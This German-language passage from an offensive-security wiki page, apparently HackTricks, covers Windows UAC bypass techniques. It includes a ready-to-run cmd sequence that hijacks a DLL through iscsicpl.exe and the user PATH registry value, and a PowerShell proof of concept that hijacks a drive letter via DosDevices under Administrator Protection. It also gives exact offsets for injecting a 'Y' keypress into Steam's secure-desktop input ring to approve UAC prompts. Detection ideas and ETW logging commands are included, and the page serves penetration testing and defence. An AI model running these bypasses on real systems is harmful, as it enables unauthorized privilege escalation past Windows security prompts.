Wenn Lärm kein Problem ist, kann ein Tool wie [**ForceAdmin**](https://github.com/Chainski/ForceAdmin) wiederholt eine Erhöhung der Berechtigungen anfordern, bis der Benutzer sie akzeptiert.

### Dein eigener Bypass – grundlegende UAC-Bypass-Methodik

Wenn du dir **UACME** ansiehst, wirst du feststellen, dass **viele UAC-Bypasses DLL hijacking ausnutzen** (häufig, indem eine erhöhte Binärdatei eine vom Angreifer kontrollierte DLL aus einem beschreibbaren Pfad lädt). [Lies hier, wie du eine DLL-Hijacking-Schwachstelle findest](../windows-local-privilege-escalation/dll-hijacking/index.html).

1. Finde eine Binärdatei, die **autoelevate** (prüfe, ob sie bei der Ausführung mit einem hohen Integritätslevel läuft).
2. Suche mit procmon nach Ereignissen mit dem Hinweis "**NAME NOT FOUND**", die für **DLL Hijacking** anfällig sein könnten.
3. Wahrscheinlich musst du die DLL in einen **geschützten Pfad** schreiben (z. B. C:\Windows\System32), für den du keine Schreibberechtigungen hast. Das lässt sich folgendermaßen umgehen:
   1. **wusa.exe**: Windows 7, 8 und 8.1. Damit kann der Inhalt einer CAB-Datei in geschützte Pfade extrahiert werden (weil dieses Tool mit einem hohen Integritätslevel ausgeführt wird).
   2. **IFileOperation**: Windows 10.
4. Erstelle ein **Skript**, das deine DLL in den geschützten Pfad kopiert und die anfällige, automatisch erhöhte Binärdatei ausführt.

### Eine weitere UAC-Bypass-Technik

Dabei wird geprüft, ob eine **autoElevated-Binärdatei** versucht, aus der **Registry** den **Namen/Pfad** einer **Binärdatei** oder eines **Befehls** auszulesen, der **ausgeführt** werden soll (besonders interessant ist dies, wenn die Binärdatei diese Informationen in **HKCU** sucht).

### UAC-Bypass über `SysWOW64\iscsicpl.exe` + DLL-Hijacking über den Benutzer-`PATH`

Die 32-Bit-Datei `C:\Windows\SysWOW64\iscsicpl.exe` ist eine **automatisch erhöhte** Binärdatei, die dazu gebracht werden kann, `iscsiexe.dll` über die Suchreihenfolge zu laden. Wenn du eine bösartige `iscsiexe.dll` in einem **vom Benutzer beschreibbaren** Ordner ablegen und anschließend den `PATH` des aktuellen Benutzers ändern kannst (zum Beispiel über `HKCU\Environment\Path`), sodass dieser Ordner durchsucht wird, lädt Windows möglicherweise die Angreifer-DLL in den erhöhten `iscsicpl.exe`-Prozess, **ohne eine UAC-Abfrage anzuzeigen**.<sup>[[1]](#references)[[6]](#references)</sup>

Praktische Hinweise:
- Das ist nützlich, wenn der aktuelle Benutzer Mitglied der Gruppe **Administrators** ist, aber aufgrund von UAC mit **Medium Integrity** läuft.
- Für diesen Bypass ist die **SysWOW64**-Kopie relevant. Betrachte die **System32**-Kopie als separate Binärdatei und überprüfe ihr Verhalten unabhängig.
- Der Angriffsvektor kombiniert **Auto-Elevation** und **DLL search-order hijacking**. Daher eignet sich derselbe ProcMon-Ablauf wie bei anderen UAC-Bypasses, um das Laden der fehlenden DLL zu überprüfen.

Minimaler Ablauf:

```cmd
copy iscsiexe.dll %TEMP%\iscsiexe.dll
reg add "HKCU\Environment" /v Path /t REG_SZ /d "%TEMP%" /f
C:\Windows\System32\cmd.exe /c C:\Windows\SysWOW64\iscsicpl.exe
```

Detection-Ideen:
- Alarmiere bei `reg add` / Registry-Schreibvorgängen nach `HKCU\Environment\Path`, auf die unmittelbar die Ausführung von `C:\Windows\SysWOW64\iscsicpl.exe` folgt.
- Suche nach `iscsiexe.dll` an **benutzergesteuerten** Speicherorten wie `%TEMP%` oder `%LOCALAPPDATA%\Microsoft\WindowsApps`.
- Korreliere Starts von `iscsicpl.exe` mit unerwarteten Child-Prozessen oder DLL-Ladevorgängen außerhalb der normalen Windows-Verzeichnisse.

### Neuere Forschung, die separat geprüft werden sollte

Einige Ketten aus der Forschung nach 2024 sehen nicht mehr wie die klassischen Registry-Hijacks unter `HKCU\Software\Classes` aus. Beispielsweise kann die Vergiftung des Aktivierungskontext-Caches einen **Laufwerksumleiter** und eine **DLL-Umleitung** kombinieren, um über vertrauenswürdige UI- bzw. automatisch erhöhte Binärdateien wie `ctfmon.exe` und spätere Ziele wie `fodhelper.exe` von mittlerer zu hoher Integrität zu gelangen. Anstatt den umfangreichen PoC hier zu duplizieren, sieh dir die kompakten Payload-Beispiele hier an:

{{#ref}}
../windows-local-privilege-escalation/windows-c-payloads.md
{{#endref}}

### Hijack von Laufwerksbuchstaben über die DOS-Gerätezuordnung pro Anmeldesitzung in Administrator Protection (Vorschau)

> [!NOTE]
> Stand August 2026 dokumentiert Microsoft Administrator Protection weiterhin als **Insider-Vorschau**: Die Einführung im Oktober 2025 wurde zurückgenommen und ist für einen späteren Zeitpunkt geplant. Vergewissere dich vor dem Testen dieser Ketten, dass **Admin Approval Mode with Administrator protection** tatsächlich aktiviert ist und das Gerät neu gestartet wurde; eine unveränderte Versionszeichenfolge für 25H2 allein beweist nicht, dass die Funktion aktiv ist.<sup>[[10]](#references)</sup>

Die vollständige Angriffsfläche von `RAiLaunchAdminProcess` / UIAccess auf Windows-11-25H2-Vorschau-Builds findest du auf der entsprechenden Seite:

{{#ref}}
../windows-local-privilege-escalation/uiaccess-admin-protection-bypass.md
{{#endref}}

Windows 11 25H2 „Administrator Protection“ verwendet Shadow-Admin-Tokens mit sitzungsspezifischen `\Sessions\0\DosDevices/<LUID>`-Zuordnungen. Das Verzeichnis wird beim ersten Auflösen von `\??` verzögert durch `SeGetTokenDeviceMap` erstellt. Wenn der Angreifer sich nur mit **SecurityIdentification** als Shadow-Admin-Token ausgibt, wird das Verzeichnis mit dem Angreifer als **Besitzer** erstellt (es erbt `CREATOR OWNER`). Dadurch erhalten Laufwerksbuchstaben-Links Vorrang vor `\GLOBAL??`.<sup>[[7]](#references)</sup>

**Schritte:**

1. Rufe in einer Sitzung mit geringen Berechtigungen `RAiProcessRunOnce` auf, um ein Shadow-Admin-`runonce.exe` ohne Eingabeaufforderung zu starten.
2. Dupliziere dessen primäres Token als **Identification**-Token und gib dich damit als Identität aus, während du `\??` öffnest, um die Erstellung von `\Sessions\0\DosDevices/<LUID>` mit dem Angreifer als Besitzer zu erzwingen.
3. Erstelle dort einen `C:`-Symlink, der auf vom Angreifer kontrollierten Speicher verweist. Nachfolgende Dateisystemzugriffe in dieser Sitzung lösen `C:` zum Angreiferpfad auf und ermöglichen so einen DLL-/Datei-Hijack ohne Eingabeaufforderung.

**PowerShell-PoC (NtObjectManager):**
```powershell
$pid = Invoke-RAiProcessRunOnce
$p = Get-Process -Id $pid
$t = Get-NtToken -Process $p
$id = New-NtTokenDuplicate -Token $t -ImpersonationLevel Identification
Invoke-NtToken $id -ImpersonationLevel Identification { Get-NtDirectory "\??" | Out-Null }
$auth = Get-NtTokenId -Authentication -Token $id
New-NtSymbolicLink "\Sessions\0\DosDevices/$auth/C:" "\??\\C:\\Users\\attacker\\loot"
```

Auf Preview-Hosts protokolliert Administrator Protection Genehmigungen und Fehler als ETW-Ereignisse **15031** und **15032** unter dem Provider `Microsoft-Windows-LUA`. Die Ereignisse enthalten die SID des Anforderers, den Anwendungspfad, das Ergebnis, das verwaltete Administratorkonto und die Authentifizierungsmethode. Wiederholte Exploit-Versuche oder fehlgeschlagene UI-Steuerung bleiben daher nicht ohne Telemetriedaten.<sup>[[10]](#references)</sup>

```cmd
logman start AdminProtectionTrace -p {93c05d69-51a3-485e-877f-1806a8731346} -ets
rem reproduce the elevation attempt
logman stop AdminProtectionTrace -ets
```



### Eingaben vom sicheren Desktop über einen beschreibbaren Shared-Memory-Ring weitergeleitet

Ein Secure-Desktop-Helfer kann die UAC-Abfrage untergraben, wenn ein Benutzer mit mittlerer Integritätsstufe in seine Eingabe-IPC schreiben kann. Beim berichteten Steam-Design startet `IClientSecureDesktop::BStartStreaming` `secure_desktop_capture.exe` als SYSTEM auf `winsta0\winlogon`. Der Prozess stellt `Global\SecureDesktopInput_mem-IPCWrapper` mit `GENERIC_ALL`-Zugriff für Benutzer bereit; der Helfer verarbeitet Einträge im Ringpuffer und ruft auf dem sicheren Desktop `SendInput` auf. Das unterscheidet sich von UIAccess oder einer Änderung von `PromptOnSecureDesktop`: Die Eingaben werden von einem Prozess weitergeleitet, der bereits dort ausgeführt wird. Siehe [Service-IPC-Bootstrap](../windows-local-privilege-escalation/abusing-auto-updaters-and-ipc.md#shared-memory-bootstrap-into-privileged-service-ipc), um zu erfahren, wie der Client diesen Handler erreicht. <sup>[[15]](#references)[[16]](#references)</sup>

Der Ringpuffer hat 128 Slots mit jeweils 173 Bytes. Die Schreib- und Lesezähler befinden sich bei `0x414` und `0x418`, Slot `N` bei `0x41c + 173*N`. Setze das erste Byte des Slots für Klartext auf `0`, kopiere unmittelbar danach eine 40 Byte große Windows-`INPUT`-Struktur und erhöhe anschließend den Schreibzähler. Bei einem Administrator mit mittlerer Integritätsstufe, der eine Zustimmungsabfrage sieht, kann ein Tastendruck mit `Y` (Taste runter und wieder hoch) die zustimmende UAC-Schaltfläche aktivieren, nachdem eine Anwendung gestartet wurde, die eine Erhöhung anfordert; eine Anmeldeinformationsabfrage für einen Standardbenutzer lässt sich damit nicht beantworten. Die **Zustimmungsschranke ist weiterhin relevant**: Der Helfer leitet Eingaben nur weiter, nachdem der Benutzer der Eingabeaufforderung `InputEnabled` für den aktuellen 90-tägigen Autorisierungszeitraum zugestimmt hat. Eine les- und beschreibbare Speicherzuordnung allein beweist nicht, dass Eingaben die Abfrage erreichen; vergleiche bei einem kontrollierten Test den Lesezähler vor und nach dem Test. <sup>[[15]](#references)[[16]](#references)</sup>

## References

- [1] [LOLBAS: Iscsicpl.exe](https://lolbas-project.github.io/lolbas/Binaries/Iscsicpl/)
- [2] [Microsoft Docs – Funktionsweise der Benutzerkontensteuerung](https://learn.microsoft.com/windows/security/identity-protection/user-account-control/how-user-account-control-works)
- [3] [UACME – Sammlung von UAC-Bypass-Techniken](https://github.com/hfiref0x/UACME)
- [4] [WinPwnage – Kompatibilitätsscanner und Launcher für UAC-Bypass](https://github.com/rootm0s/WinPwnage)
- [5] [Checkpoint Research – KONNI setzt KI ein, um PowerShell-Backdoors zu generieren](https://research.checkpoint.com/2026/konni-targets-developers-with-ai-malware/)
- [6] [Check Point Research – Operation TrueChaos: Zero-Day-Exploits gegen südostasiatische Regierungsziele](https://research.checkpoint.com/2026/operation-truechaos-0-day-exploitation-against-southeast-asian-government-targets/)
- [7] [Project Zero – Umgehung des Windows Administrator Protection](https://projectzero.google/2026/26/windows-administrator-protection.html)
- [8] [Sigma / Detection.FYI – UAC-Bypass über die SilentCleanup-Aufgabe](https://detection.fyi/sigmahq/sigma/windows/registry/registry_set/registry_set_bypass_uac_using_silentcleanup_task/)
- [9] [R41N3RZUF477 – UnifiedConsent-, TabTip- und Narrator-Bypasses für „Immer benachrichtigen“](https://github.com/hfiref0x/UACME/issues/173)
- [10] [Microsoft Learn – Administratorschutz](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/administrator-protection/)
- [11] [Google Project Zero – Aufruf lokaler Windows-RPC-Server aus .NET](https://projectzero.google/2019/12/calling-local-windows-rpc-servers-from.html)
- [12] [Kaspersky Securelist – HoneyMyte erweitert CoolClient um ein signiertes Windows-Kernel-Rootkit](https://securelist.com/honeymyte-coolclient-driver-rootkit/121028)
- [13] [Group-IB – KGB RAT: Ein vollständig unerkennbarer Windows-Trojaner zum Ausspionieren, Stehlen und Terrorisieren](https://www.group-ib.com/blog/kgb-rat-windows-fud-trojan/)
- [14] [LOLBAS – ComputerDefaults.exe](https://lolbas-project.github.io/lolbas/Binaries/ComputerDefaults/)
- [15] [Atredis – Das Ventil umlegen](https://atredis.com/blog/2026/10/28/turning-the-valve)
- [16] [Atredis – PoCs zu „Das Ventil umlegen“](https://github.com/atredispartners/proof-of-concept/tree/main/turning-the-valve/code)
